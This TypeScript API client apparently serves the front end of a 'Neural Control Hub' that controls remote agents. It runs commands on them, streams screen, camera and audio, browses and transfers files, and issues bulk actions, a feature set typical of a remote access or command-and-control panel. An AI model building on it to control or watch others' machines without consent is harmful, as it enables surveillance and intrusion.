/**
 * API Service for Neural Control Hub Frontend
 * Handles all HTTP API communication with the backend
 */

// API Configuration
const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8080';
const API_ENDPOINTS = {
  // Authentication
  auth: {
    login: '/api/auth/login',
    logout: '/api/auth/logout',
    status: '/api/auth/status',
  },
  // Agents
  agents: {
    list: '/api/agents',
    details: (id: string) => `/api/agents/${id}`,
    search: '/api/agents/search',
    performance: (id: string) => `/api/agents/${id}/performance`,
    execute: (id: string) => `/api/agents/${id}/execute`,
    commandHistory: (id: string) => `/api/agents/${id}/commands/history`,
    files: (id: string) => `/api/agents/${id}/files`,
    download: (id: string) => `/api/agents/${id}/files/download`,
    upload: (id: string) => `/api/agents/${id}/files/upload`,
    startStream: (id: string, type: string) => `/api/agents/${id}/stream/${type}/start`,
    stopStream: (id: string, type: string) => `/api/agents/${id}/stream/${type}/stop`,
  },
  // System
  system: {
    stats: '/api/system/stats',
    info: '/api/system/info',
  },
  // Activity
  activity: '/api/activity',
  // Actions
  actions: {
    bulk: '/api/actions/bulk',
  },
  // Settings
  settings: {
    get: '/api/settings',
    update: '/api/settings',
    reset: '/api/settings/reset',
  },
} as const;

// Types
export interface ApiResponse<T = any> {
  success?: boolean;
  data?: T;
  error?: string;
  message?: string;
}

export interface Agent {
  id: string;
  name: string;
  status: 'online' | 'offline';
  platform: string;
  ip: string;
  last_seen: string;
  capabilities: string[];
  performance: {
    cpu: number;
    memory: number;
    network: number;
  };
}

export interface SystemStats {
  agents: {
    total: number;
    online: number;
    offline: number;
  };
  streams: {
    active: number;
    screen: number;
    camera: number;
    audio: number;
  };
  commands: {
    executed_today: number;
    successful: number;
    failed: number;
  };
  network: {
    status: string;
    latency: number;
    throughput: number;
  };
}

export interface ActivityEvent {
  id: string;
  type: 'connection' | 'command' | 'stream' | 'file' | 'security' | 'system';
  action: string;
  details: string;
  agent_id: string;
  agent_name: string;
  timestamp: string;
  status: 'success' | 'warning' | 'error' | 'info';
}

// API Client Class
class ApiClient {
  private baseUrl: string;

  constructor(baseUrl: string = API_BASE_URL) {
    this.baseUrl = baseUrl;
  }

  private async request<T>(
    endpoint: string,
    options: RequestInit = {}
  ): Promise<ApiResponse<T>> {
    const url = `${this.baseUrl}${endpoint}`;
    
    const defaultOptions: RequestInit = {
      credentials: 'include', // Include cookies for session management
      headers: {
        'Content-Type': 'application/json',
        ...options.headers,
      },
    };

    try {
      const response = await fetch(url, { ...defaultOptions, ...options });
      const data = await response.json();

      if (!response.ok) {
        return {
          success: false,
          error: data.error || `HTTP ${response.status}`,
        };
      }

      return {
        success: true,
        data,
      };
    } catch (error) {
      console.error('API request failed:', error);
      return {
        success: false,
        error: error instanceof Error ? error.message : 'Network error',
      };
    }
  }

  // Authentication Methods
  async login(password: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.auth.login, {
      method: 'POST',
      body: JSON.stringify({ password }),
    });
  }

  async logout(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.auth.logout, {
      method: 'POST',
    });
  }

  async checkAuthStatus(): Promise<ApiResponse<{ authenticated: boolean }>> {
    return this.request(API_ENDPOINTS.auth.status);
  }

  // Agent Methods
  async getAgents(): Promise<ApiResponse<{ agents: Agent[]; total_count: number; online_count: number }>> {
    return this.request(API_ENDPOINTS.agents.list);
  }

  async getAgentDetails(agentId: string): Promise<ApiResponse<Agent>> {
    return this.request(API_ENDPOINTS.agents.details(agentId));
  }

  async searchAgents(params: {
    q?: string;
    status?: string;
    platform?: string;
    capability?: string;
  }): Promise<ApiResponse<{ agents: Agent[] }>> {
    const queryParams = new URLSearchParams();
    Object.entries(params).forEach(([key, value]) => {
      if (value) queryParams.append(key, value);
    });
    
    const endpoint = `${API_ENDPOINTS.agents.search}?${queryParams.toString()}`;
    return this.request(endpoint);
  }

  async getAgentPerformance(agentId: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.performance(agentId));
  }

  async executeCommand(agentId: string, command: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.execute(agentId), {
      method: 'POST',
      body: JSON.stringify({ command }),
    });
  }

  async getCommandHistory(agentId: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.commandHistory(agentId));
  }

  async startStream(agentId: string, streamType: 'screen' | 'camera' | 'audio', quality: string = 'high'): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.startStream(agentId, streamType), {
      method: 'POST',
      body: JSON.stringify({ quality }),
    });
  }

  async stopStream(agentId: string, streamType: 'screen' | 'camera' | 'audio'): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.stopStream(agentId, streamType), {
      method: 'POST',
    });
  }

  async browseFiles(agentId: string, path: string = '/'): Promise<ApiResponse> {
    const endpoint = `${API_ENDPOINTS.agents.files(agentId)}?path=${encodeURIComponent(path)}`;
    return this.request(endpoint);
  }

  async downloadFile(agentId: string, filePath: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.download(agentId), {
      method: 'POST',
      body: JSON.stringify({ path: filePath }),
    });
  }

  async uploadFile(agentId: string, file: File): Promise<ApiResponse> {
    const formData = new FormData();
    formData.append('file', file);

    return this.request(API_ENDPOINTS.agents.upload(agentId), {
      method: 'POST',
      body: formData,
      headers: {}, // Let browser set Content-Type for FormData
    });
  }

  // System Methods
  async getSystemStats(): Promise<ApiResponse<SystemStats>> {
    return this.request(API_ENDPOINTS.system.stats);
  }

  async getSystemInfo(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.system.info);
  }

  // Activity Methods
  async getActivity(type: string = 'all', limit: number = 50): Promise<ApiResponse<{ activities: ActivityEvent[] }>> {
    const params = new URLSearchParams({ type, limit: limit.toString() });
    return this.request(`${API_ENDPOINTS.activity}?${params.toString()}`);
  }

  // Bulk Actions
  async executeBulkAction(action: string, agentIds: string[] = []): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.actions.bulk, {
      method: 'POST',
      body: JSON.stringify({ action, agent_ids: agentIds }),
    });
  }

  // Settings Methods
  async getSettings(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.settings.get);
  }

  async updateSettings(settings: any): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.settings.update, {
      method: 'POST',
      body: JSON.stringify(settings),
    });
  }

  async resetSettings(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.settings.reset, {
      method: 'POST',
    });
  }
}

// Export singleton instance
export const apiClient = new ApiClient();
export default apiClient;